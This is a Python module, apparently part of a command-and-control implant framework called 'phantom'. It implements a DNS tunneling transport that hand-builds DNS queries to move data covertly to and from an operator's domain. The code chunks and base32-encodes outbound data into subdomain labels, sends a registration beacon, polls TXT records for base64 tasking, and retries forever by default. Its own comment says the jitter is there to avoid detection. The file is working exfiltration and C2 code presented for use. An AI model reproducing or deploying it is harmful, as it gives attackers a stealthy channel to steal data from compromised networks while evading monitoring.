"""DNS tunneling transport — exfiltrate C2 data through DNS queries.

Outbound: data is base32-encoded into subdomain labels of TXT queries.
  Query format: <seq>.<chunk_idx>.<base32_data>.<c2_domain> → TXT
Inbound:  C2 responds with base64-encoded payload in the TXT record value.

All DNS packets are built/parsed manually over raw UDP sockets — no
third-party dependencies required.
"""

import base64
import logging
import os
import random
import socket
import struct
import threading
import time
import uuid

log = logging.getLogger("phantom.transport.dns")

# DNS header constants
_QTYPE_TXT = 16
_QTYPE_CNAME = 5
_QCLASS_IN = 1
_DNS_FLAG_RD = 0x0100  # Recursion Desired


def _build_dns_query(domain: str, qtype: int = _QTYPE_TXT) -> tuple[bytes, int]:
    """Build a raw DNS query packet.

    DNS header layout (12 bytes):
      ID(2) | Flags(2) | QDCOUNT(2) | ANCOUNT(2) | NSCOUNT(2) | ARCOUNT(2)
    Question section:
      QNAME(variable) | QTYPE(2) | QCLASS(2)
    """
    txn_id = random.randint(0, 0xFFFF)
    header = struct.pack(">HHHHHH", txn_id, _DNS_FLAG_RD, 1, 0, 0, 0)

    # Encode domain name as DNS labels
    qname = b""
    for label in domain.split("."):
        encoded = label.encode("ascii")
        qname += struct.pack("B", len(encoded)) + encoded
    qname += b"\x00"

    question = qname + struct.pack(">HH", qtype, _QCLASS_IN)
    return header + question, txn_id


def _parse_dns_response(data: bytes, expected_id: int) -> bytes | None:
    """Parse a DNS response and extract TXT record data.

    Response layout follows RFC 1035: header + question + answer RRs.
    For TXT records, each answer contains one or more character-strings
    prefixed by a length byte.
    """
    if len(data) < 12:
        return None

    txn_id, flags, qdcount, ancount = struct.unpack(">HHHH", data[:8])
    if txn_id != expected_id:
        return None

    # Check RCODE (lower 4 bits of flags)
    rcode = flags & 0x000F
    if rcode != 0:
        log.debug(f"DNS response error, rcode={rcode}")
        return None

    if ancount == 0:
        return None

    # Skip question section
    offset = 12
    for _ in range(qdcount):
        offset = _skip_dns_name(data, offset)
        if offset is None:
            return None
        offset += 4  # QTYPE + QCLASS

    # Parse answer section — extract first TXT record
    for _ in range(ancount):
        offset = _skip_dns_name(data, offset)
        if offset is None or offset + 10 > len(data):
            return None

        rtype, rclass, ttl, rdlength = struct.unpack(">HHIH", data[offset:offset + 10])
        offset += 10

        if rtype == _QTYPE_TXT:
            # TXT RDATA: one or more <length><text> strings
            txt_data = b""
            end = offset + rdlength
            pos = offset
            while pos < end:
                slen = data[pos]
                pos += 1
                txt_data += data[pos:pos + slen]
                pos += slen
            return txt_data

        offset += rdlength

    return None


def _skip_dns_name(data: bytes, offset: int) -> int | None:
    """Skip a DNS name (handles both labels and compression pointers)."""
    if offset >= len(data):
        return None
    while True:
        if offset >= len(data):
            return None
        length = data[offset]
        if length == 0:
            return offset + 1
        # Compression pointer (top two bits set)
        if (length & 0xC0) == 0xC0:
            return offset + 2
        offset += 1 + length


def _resolve_system_nameserver() -> str:
    """Read the system DNS resolver from /etc/resolv.conf."""
    try:
        with open("/etc/resolv.conf", "r") as f:
            for line in f:
                line = line.strip()
                if line.startswith("nameserver"):
                    parts = line.split()
                    if len(parts) >= 2:
                        return parts[1]
    except OSError:
        pass
    return "8.8.8.8"


class DnsTransport:
    """C2 transport over DNS — tunnels data through TXT queries/responses.

    Outbound messages are split into chunks, base32-encoded, and sent as
    subdomain labels in DNS TXT queries.  Inbound responses are base64-decoded
    from TXT record values.

    Max usable payload per query is ~180 bytes (63 chars per label, 253 total
    domain length, minus overhead for sequence/chunk labels and domain suffix).
    """

    # Max bytes of raw data per DNS query after base32 expansion and label
    # splitting.  63-char label limit with base32 = 39 bytes per label;
    # use two data labels to stay under 253-char total domain length.
    _MAX_PAYLOAD_PER_QUERY = 70

    def __init__(self, domain: str, resolver: str | None = None,
                 resolver_port: int = 53, timeout: float = 5.0,
                 retry_count: int = -1, retry_delay: float = 10.0,
                 jitter: float = 0.3):
        self.domain = domain
        self.resolver = resolver or _resolve_system_nameserver()
        self.resolver_port = resolver_port
        self.timeout = timeout
        self.retry_count = retry_count
        self.retry_delay = retry_delay
        self.jitter = jitter
        self._connected = False
        self._sock: socket.socket | None = None
        self._seq = 0
        self._seq_lock = threading.Lock()
        self._session_id = uuid.uuid4().hex[:8]

    @property
    def connected(self) -> bool:
        return self._connected

    def _next_seq(self) -> int:
        with self._seq_lock:
            s = self._seq
            self._seq += 1
            return s

    def _create_socket(self) -> socket.socket:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(self.timeout)
        return s

    def _send_dns_query(self, subdomain: str) -> bytes | None:
        """Send a single DNS TXT query and return the TXT record data."""
        fqdn = f"{subdomain}.{self.domain}"

        # Validate label lengths
        for label in fqdn.split("."):
            if len(label) > 63:
                log.error(f"DNS label exceeds 63 chars: {len(label)}")
                return None
        if len(fqdn) > 253:
            log.error(f"FQDN exceeds 253 chars: {len(fqdn)}")
            return None

        packet, txn_id = _build_dns_query(fqdn, _QTYPE_TXT)

        try:
            if not self._sock:
                self._sock = self._create_socket()
            self._sock.sendto(packet, (self.resolver, self.resolver_port))
            resp_data, _ = self._sock.recvfrom(4096)
            return _parse_dns_response(resp_data, txn_id)
        except socket.timeout:
            log.debug("DNS query timed out")
            return None
        except OSError as e:
            log.warning(f"DNS query failed: {e}")
            return None

    def _apply_jitter(self):
        """Sleep a small random interval to avoid rapid-fire DNS query detection."""
        if self.jitter > 0:
            delay = random.uniform(0.05, self.jitter)
            time.sleep(delay)

    def _chunk_data(self, data: bytes) -> list[bytes]:
        """Split data into chunks that fit within DNS label constraints."""
        chunks = []
        for i in range(0, len(data), self._MAX_PAYLOAD_PER_QUERY):
            chunks.append(data[i:i + self._MAX_PAYLOAD_PER_QUERY])
        return chunks

    def _encode_chunk(self, chunk: bytes) -> str:
        """Base32-encode a chunk and format as valid DNS labels.

        Base32 output is lowercased and split into labels of at most 63 chars.
        Padding '=' chars are stripped (receiver can re-pad).
        """
        encoded = base64.b32encode(chunk).decode("ascii").rstrip("=").lower()
        # Split into labels of max 63 characters
        labels = []
        for i in range(0, len(encoded), 63):
            labels.append(encoded[i:i + 63])
        return ".".join(labels)

    def connect(self) -> bool:
        attempts = 0
        while self.retry_count == -1 or attempts < self.retry_count:
            try:
                self._sock = self._create_socket()

                # Send registration beacon: s<session>.reg.<domain>
                subdomain = f"{self._session_id}.reg"
                result = self._send_dns_query(subdomain)
                if result is not None:
                    self._connected = True
                    log.info(f"DNS transport connected via {self.resolver} "
                             f"through {self.domain}")
                    return True
            except Exception as e:
                log.warning(f"DNS connect error: {e}")

            attempts += 1
            if self.retry_count != -1 and attempts >= self.retry_count:
                return False
            time.sleep(self.retry_delay)
        return False

    def send(self, data: bytes) -> bool:
        """Chunk, base32-encode, and send data as a series of DNS TXT queries.

        Each query subdomain: <session>.<seq>.<chunk_index>.<total>.<b32data>
        """
        if not self._connected:
            return False

        chunks = self._chunk_data(data)
        seq = self._next_seq()
        total = len(chunks)

        for idx, chunk in enumerate(chunks):
            encoded_data = self._encode_chunk(chunk)
            subdomain = f"{self._session_id}.{seq}.{idx}.{total}.{encoded_data}"

            # Verify total FQDN length
            fqdn = f"{subdomain}.{self.domain}"
            if len(fqdn) > 253:
                log.error(f"Encoded FQDN too long ({len(fqdn)} chars), "
                          "reducing chunk size")
                return False

            result = self._send_dns_query(subdomain)
            if result is None:
                # Retry once on failure
                self._apply_jitter()
                result = self._send_dns_query(subdomain)
                if result is None:
                    log.error(f"Failed to send chunk {idx}/{total}")
                    return False

            self._apply_jitter()

        return True

    def recv(self) -> bytes | None:
        """Poll for inbound data via DNS TXT query.

        Send a poll query: <session>.poll.<domain>
        Response TXT record contains base64-encoded data, optionally split
        across multiple queries indicated by a chunk header.
        """
        if not self._connected:
            return None

        seq = self._next_seq()
        subdomain = f"{self._session_id}.{seq}.poll"
        result = self._send_dns_query(subdomain)
        if not result:
            return None

        try:
            decoded = result.decode("ascii", errors="ignore").strip()
            if not decoded or decoded == "NOOP":
                return None

            # Check for chunked response: first byte indicates chunk protocol
            # Format: "C<total_chunks>" followed by base64 data
            if decoded.startswith("C") and ":" in decoded[:8]:
                return self._recv_chunked(decoded, seq)

            return base64.b64decode(decoded)
        except Exception as e:
            log.warning(f"DNS recv decode error: {e}")
            return None

    def _recv_chunked(self, first_response: str, base_seq: int) -> bytes | None:
        """Handle multi-chunk inbound response.

        First response format: C<total>:<base64_chunk_0>
        Subsequent chunks fetched with: <session>.<seq>.poll.<chunk_idx>
        """
        try:
            header, chunk0_data = first_response.split(":", 1)
            total = int(header[1:])
            chunks = {0: base64.b64decode(chunk0_data)}

            for idx in range(1, total):
                self._apply_jitter()
                subdomain = f"{self._session_id}.{base_seq}.poll.{idx}"
                result = self._send_dns_query(subdomain)
                if not result:
                    log.warning(f"Failed to receive chunk {idx}/{total}")
                    return None
                chunk_data = result.decode("ascii", errors="ignore").strip()
                chunks[idx] = base64.b64decode(chunk_data)

            # Reassemble in order
            return b"".join(chunks[i] for i in range(total))
        except Exception as e:
            log.error(f"Chunked recv failed: {e}")
            return None

    def disconnect(self):
        if self._connected:
            try:
                subdomain = f"{self._session_id}.bye"
                self._send_dns_query(subdomain)
            except Exception:
                pass
        self._cleanup()
        log.info("DNS transport disconnected")

    def _cleanup(self):
        self._connected = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
